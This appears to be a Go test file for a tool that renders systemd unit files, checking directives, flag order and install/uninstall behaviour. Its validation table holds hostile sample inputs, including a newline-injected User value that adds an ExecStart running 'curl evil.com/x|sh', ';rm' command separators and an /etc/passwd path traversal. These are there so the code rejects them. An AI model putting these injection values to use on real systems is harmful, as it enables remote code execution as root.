package systemd

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const (
	testUnitProject     = "demo"
	testUnitComposeFile = "/srv/demo/holos.yaml"
	testUnitHolosBinary = "/usr/bin/holos"
	testUnitStateDir    = "/tmp/holos-state"
)

func testDemoUnitSpec(scope Scope) UnitSpec {
	return UnitSpec{
		Project:     testUnitProject,
		ComposeFile: testUnitComposeFile,
		HolosBinary: testUnitHolosBinary,
		StateDir:    testUnitStateDir,
		Scope:       scope,
	}
}

func TestRender_UserScope(t *testing.T) {
	t.Setenv(xdgConfigHomeEnv, "/tmp/xdg")

	path, content, err := Render(UnitSpec{
		Project:     "web",
		ComposeFile: "/srv/holos/web/holos.yaml",
		HolosBinary: "/usr/local/bin/holos",
		Scope:       ScopeUser,
	})
	if err != nil {
		t.Fatalf("render: %v", err)
	}

	if want := "/tmp/xdg/systemd/user/holos-web.service"; path != want {
		t.Fatalf("path = %q, want %q", path, want)
	}

	// Key invariants of the emitted unit.
	mustContain(t, content,
		"Description=holos project web",
		"ExecStart=/usr/local/bin/holos up -f /srv/holos/web/holos.yaml",
		"ExecStop=/usr/local/bin/holos down web",
		"WantedBy=default.target",
		"Type=oneshot",
		"RemainAfterExit=yes",
	)
	// User scope must not emit a User= directive: systemd --user
	// doesn't honor it and would reject the unit.
	mustNotContain(t, content, "\nUser=")
}

func TestRender_SystemScopeWithUser(t *testing.T) {
	_, content, err := Render(UnitSpec{
		Project:     "db",
		ComposeFile: "/srv/db/holos.yaml",
		HolosBinary: "/usr/bin/holos",
		StateDir:    "/var/lib/holos",
		Scope:       ScopeSystem,
		User:        "holos",
	})
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	mustContain(t, content,
		"WantedBy=multi-user.target",
		"User=holos",
		"ExecStart=/usr/bin/holos up --state-dir /var/lib/holos -f /srv/db/holos.yaml",
		"ExecStop=/usr/bin/holos down --state-dir /var/lib/holos db",
	)
}

// TestRender_StateFlagBeforePositional pins the layout of ExecStop so
// it never regresses to `holos down <project> --state-dir <dir>`. Go's
// flag package stops parsing at the first non-flag token, so a
// trailing --state-dir would silently be ignored at boot/shutdown time
// and the unit would touch the default state path. The test fakes the
// stop command via os.Args parsing in cmd/holos so we exercise the
// exact same flag-order contract end-to-end.
func TestRender_StateFlagBeforePositional(t *testing.T) {
	_, content, err := Render(testDemoUnitSpec(ScopeSystem))
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	for _, badForm := range []string{
		"holos down demo --state-dir",
		"holos up -f /srv/demo/holos.yaml --state-dir",
	} {
		mustNotContain(t, content, badForm)
	}
	mustContain(t, content,
		"ExecStart=/usr/bin/holos up --state-dir /tmp/holos-state -f /srv/demo/holos.yaml",
		"ExecStop=/usr/bin/holos down --state-dir /tmp/holos-state demo",
	)
}

func TestRenderStateFlag(t *testing.T) {
	t.Parallel()

	if got := renderStateFlag(""); got != "" {
		t.Fatalf("renderStateFlag(empty) = %q, want empty", got)
	}
	if got := renderStateFlag(testUnitStateDir); got != " --state-dir /tmp/holos-state" {
		t.Fatalf("renderStateFlag = %q, want state-dir flag with leading space", got)
	}
}

func TestRender_ValidationRejectsRelativePaths(t *testing.T) {
	cases := []struct {
		name string
		spec UnitSpec
	}{
		{
			name: "compose relative",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "relative.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "binary relative",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "empty project",
			spec: UnitSpec{
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "whitespace project",
			spec: UnitSpec{
				Project:     "my proj",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "bad scope",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       "global",
			},
		},
		{
			name: "space in compose file",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/srv/my holos/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "space in binary path",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/opt/My Apps/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "space in state dir",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				StateDir:    "/var/lib/holos state",
				Scope:       ScopeSystem,
			},
		},
		{
			name: "systemd specifier in path",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/etc/%H/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "command separator in path",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/abs/holos.yaml;rm",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "newline in path",
			spec: UnitSpec{
				Project:     "x",
				ComposeFile: "/abs/holos.yaml\ninjected",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "project path traversal",
			spec: UnitSpec{
				Project:     "foo/../../etc/passwd",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeSystem,
			},
		},
		{
			name: "project uppercase",
			spec: UnitSpec{
				Project:     "MyProj",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		{
			name: "project leading hyphen",
			spec: UnitSpec{
				Project:     "-bad",
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: "/usr/bin/holos",
				Scope:       ScopeUser,
			},
		},
		// The next four cases cover User= injection. Each value
		// would be accepted verbatim by the previous Render and
		// written into a root-owned [Service] block; only the
		// newline case actually lands a second directive, but
		// spaces and shell metacharacters are rejected on the same
		// principle (values that don't round-trip through systemd
		// parsing are bugs waiting to happen).
		{
			name: "user newline injection",
			spec: UnitSpec{
				Project:     testUnitProject,
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: testUnitHolosBinary,
				Scope:       ScopeSystem,
				User:        "alice\nExecStart=/bin/curl evil.com/x|sh",
			},
		},
		{
			name: "user with shell metachar",
			spec: UnitSpec{
				Project:     testUnitProject,
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: testUnitHolosBinary,
				Scope:       ScopeSystem,
				User:        "alice;rm",
			},
		},
		{
			name: "user uppercase",
			spec: UnitSpec{
				Project:     testUnitProject,
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: testUnitHolosBinary,
				Scope:       ScopeSystem,
				User:        "Alice",
			},
		},
		{
			name: "user leading digit",
			spec: UnitSpec{
				Project:     testUnitProject,
				ComposeFile: "/abs/holos.yaml",
				HolosBinary: testUnitHolosBinary,
				Scope:       ScopeSystem,
				User:        "1alice",
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, _, err := Render(tc.spec); err == nil {
				t.Fatalf("expected validation error, got nil")
			}
		})
	}
}

func TestInstallUninstall_RoundTrip(t *testing.T) {
	xdg := t.TempDir()
	t.Setenv(xdgConfigHomeEnv, xdg)

	// Quarantine systemctl invocations: Install/Uninstall may try to
	// shell out if systemctl is on PATH. We don't want to touch the
	// real system bus, so we prepend a shim dir that pretends
	// systemctl does not exist.
	pathDir := t.TempDir()
	t.Setenv("PATH", pathDir)

	spec := testDemoUnitSpec(ScopeUser)
	spec.StateDir = ""

	res, err := Install(spec, false)
	if err != nil {
		t.Fatalf("install: %v", err)
	}
	if !res.SystemctlMissing {
		t.Fatalf("expected SystemctlMissing=true with empty PATH, got %+v", res)
	}
	if _, err := os.Stat(res.UnitPath); err != nil {
		t.Fatalf("unit file missing after install: %v", err)
	}
	assertMode(t, filepath.Dir(res.UnitPath), systemdUnitDirPerm)
	assertMode(t, res.UnitPath, systemdUnitFilePerm)
	want := filepath.Join(xdg, "systemd", "user", "holos-demo.service")
	if res.UnitPath != want {
		t.Fatalf("unit path = %q, want %q", res.UnitPath, want)
	}

	_, err = Uninstall(ScopeUser, testUnitProject)
	if err != nil {
		t.Fatalf("uninstall: %v", err)
	}
	if _, err := os.Stat(res.UnitPath); !os.IsNotExist(err) {
		t.Fatalf("unit file still present after uninstall (err=%v)", err)
	}

	// Second uninstall must be a no-op: systemd workflows often
	// retry idempotently (ansible, make, etc.).
	if _, err := Uninstall(ScopeUser, testUnitProject); err != nil {
		t.Fatalf("second uninstall: %v", err)
	}
}

func assertMode(t *testing.T, path string, want os.FileMode) {
	t.Helper()

	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat %s: %v", path, err)
	}
	if got := info.Mode().Perm(); got != want {
		t.Fatalf("mode for %s = %v, want %v", path, got, want)
	}
}

func mustContain(t *testing.T, haystack string, needles ...string) {
	t.Helper()
	for _, n := range needles {
		if !strings.Contains(haystack, n) {
			t.Errorf("missing %q in:\n%s", n, haystack)
		}
	}
}

func mustNotContain(t *testing.T, haystack string, needles ...string) {
	t.Helper()
	for _, n := range needles {
		if strings.Contains(haystack, n) {
			t.Errorf("unexpected %q in:\n%s", n, haystack)
		}
	}
}
